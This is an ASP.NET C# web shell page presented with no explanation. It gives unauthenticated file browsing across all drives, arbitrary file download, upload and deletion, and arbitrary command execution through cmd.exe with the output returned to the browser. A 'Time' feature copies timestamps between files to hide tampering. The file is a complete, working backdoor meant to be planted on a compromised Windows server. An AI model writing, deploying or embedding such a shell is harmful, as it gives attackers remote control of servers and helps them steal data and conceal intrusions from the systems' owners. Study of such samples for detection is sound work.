<%@ Page Language="C#" EnableViewState="false" %>
<%@ Import Namespace="System.Web.UI.WebControls" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%
string outstr = "";
cmdResult.Visible = false;
string dir = Page.MapPath(".") + "/";
if (Request.QueryString["fdir"] != null)
dir = Request.QueryString["fdir"] + "/";
dir = dir.Replace("\\", "/");
dir = dir.Replace("//", "/");
// build nav for path literal
string[] dirparts = dir.Split('/');
string linkwalk = ""; 
foreach (string curpart in dirparts)
{
if (curpart.Length == 0)
continue;
linkwalk += curpart + "/";
outstr += string.Format("<li><a href='?fdir={0}'>{1}</a></li>",
HttpUtility.UrlEncode(linkwalk),
HttpUtility.HtmlEncode(curpart));
}
lblPath.Text = outstr;

outstr = "";
foreach(DriveInfo curdrive in DriveInfo.GetDrives())
{
if (!curdrive.IsReady)
continue;
string driveRoot = curdrive.RootDirectory.Name.Replace("\\", "");
outstr += string.Format("<a class=\"label label-info\" style=\"margin-right:10px;padding:6px 20px;font-size:10pt;\" href='?fdir={0}'>{1}</a>",
HttpUtility.UrlEncode(driveRoot),
HttpUtility.HtmlEncode(driveRoot));
}
lblDrives.Text = outstr;

if ((Request.QueryString["get"] != null) && (Request.QueryString["get"].Length > 0))
{
Response.ClearContent();
Response.ContentType = "text/plain";
Response.WriteFile(Request.QueryString["get"]);
Response.End();
}

if ((Request.QueryString["clone"] != null) && (Request.QueryString["clone"].Length > 0) && (Request.QueryString["from"] != null) && (Request.QueryString["from"].Length > 0)){
	string fileCl = HttpUtility.UrlDecode(Request.QueryString["clone"]);
	string fileFrom = HttpUtility.UrlDecode(Request.QueryString["from"]);
	File.SetCreationTimeUtc(fileCl,File.GetCreationTimeUtc(fileFrom));
	File.SetLastAccessTimeUtc(fileCl,File.GetLastAccessTimeUtc(fileFrom));
	File.SetLastWriteTimeUtc(fileCl,File.GetLastWriteTimeUtc(fileFrom));
}
if ((Request.QueryString["del"] != null) && (Request.QueryString["del"].Length > 0))
File.Delete(Request.QueryString["del"]); 

if(flUp.HasFile)
{
string fileName = flUp.FileName;
int splitAt = flUp.FileName.LastIndexOfAny(new char[] { '/', '\\' });
if (splitAt >= 0)
fileName = flUp.FileName.Substring(splitAt);
flUp.SaveAs(dir + "/" + fileName);
}

DirectoryInfo di = new DirectoryInfo(dir);
outstr = "";
foreach (DirectoryInfo curdir in di.GetDirectories())
{
string fstr = string.Format("<a href='?fdir={0}'><strong>{1}</strong></a>", HttpUtility.UrlEncode(dir + "/" + curdir.Name), HttpUtility.HtmlEncode(curdir.Name));
string delfstr = string.Format("<a class='text-danger' href='?fdir={0}'>Del</a>", HttpUtility.UrlEncode(dir + "/" + curdir.Name));
outstr += string.Format("<tr><td>{0}</td><td>&lt;DIR&gt;</td><td>--</td><td>--</td><td class='text-right'>{1}</td></tr>", fstr, delfstr);
}
foreach (FileInfo curfile in di.GetFiles())
{
string fstr = string.Format("<a href='?get={0}'>{1}</a>",
HttpUtility.UrlEncode(dir + "/" + curfile.Name),
HttpUtility.HtmlEncode(curfile.Name));
string astr = string.Format("<a style=\"margin-right:15px;\" href=\"javascript:cloneFiles('{0}','{1}');\">Time</a><a class='text-danger' href='?fdir={0}&del={1}'>Del</a>",
HttpUtility.UrlEncode(dir),
HttpUtility.UrlEncode(dir + "/" + curfile.Name).Replace("//", "/"));
long calSize = curfile.Length;
string FileSize = " byte";
if (calSize > 1024){
	calSize = calSize/1024;
	FileSize = " kb";
}
FileSize = calSize.ToString() + FileSize;
outstr += string.Format("<tr><td>{0}</td><td>{1}</td><td>{2}</td><td>{3:d}</td><td class='text-right'>{4}</td></tr>", fstr, curfile.LastWriteTime.ToString(), curfile.CreationTime.ToString(), FileSize, astr);
}
lblDirOut.Text = outstr;

if (txtCmdIn.Text.Length > 0)
{
Process p = new Process();
p.StartInfo.CreateNoWindow = true;
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c " + txtCmdIn.Text;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardError = true;
p.StartInfo.WorkingDirectory = dir;
p.Start();

lblCmdOut.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
txtCmdIn.Text = txtCmdIn.Text;
fileResult.Visible = false;
cmdResult.Visible = true;
} 
%>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
	<style>body {font-size:11pt;}</style>
</head>
<body>
<div class="container-fluid" style="width:95%;margin-top:10px;">
<div class="row">
<div class="col-md-12">
<form id="form1" runat="server">
<div class="page-header shadow-md">
<div class="row">
<div class="col-xs-8" style="padding-top:8px;">
<asp:Literal runat="server" ID="lblDrives" Mode="PassThrough" />
</div>
<div class="col-xs-2">
<div class="input-group">
<asp:TextBox cssclass="form-control" runat="server" ID="txtCmdIn" />
<div class="input-group-btn">
<asp:Button cssclass="btn btn-default" runat="server" ID="cmdExec" Text="Command" />
</div>
</div>
</div>
<div class="col-xs-2">
<div class="input-group">
<asp:FileUpload cssclass="form-control" runat="server" ID="flUp" />
<div class="input-group-btn">
<asp:Button cssclass="btn btn-default" runat="server" ID="cmdUpload" Text="Upload" />
</div>
</div>
</div>
</div>
</div>
<div class="row" runat="server" id="cmdResult">
<div class="col-md-12">
<asp:TextBox id="lblCmdOut" TextMode="multiline" Mode="Encode" cssclass="form-control" rows="20" runat="server" readonly />
</div>
</div>
<div class="row" runat="server" id="fileResult">
<div class="col-md-12">
<ol class="breadcrumb">
<asp:Literal runat="server" ID="lblPath" Mode="passThrough" />
</ol>
<table class="table table-hover">
<thead>
<tr>
<th style="width:50%;">Name</th>
<th>Modified</th>
<th>Create</th>
<th style="text-align:left;padding-left:8px;">Size</th>
<th style="width: 50px">Actions</th>
</tr></thead><tbody>
<asp:Literal runat="server" ID="lblDirOut" Mode="PassThrough" />
</tbody></table>
</div>
</div>
</form>
</div>
</div>
</div>
<script type="text/javascript">
function cloneFiles(d, f){
	var getFiles = prompt("Enter file path from want clone to file.", f);
	if (getFiles != null) {
		var curentPath =  location.origin + location.pathname;
		curentPath += '?fdir=' + encodeURI(d) + '&clone=' + encodeURI(f) + '&from=' + encodeURI(getFiles);
		location.replace(curentPath);
	}
	return false;
}
</script>
</body>
</html>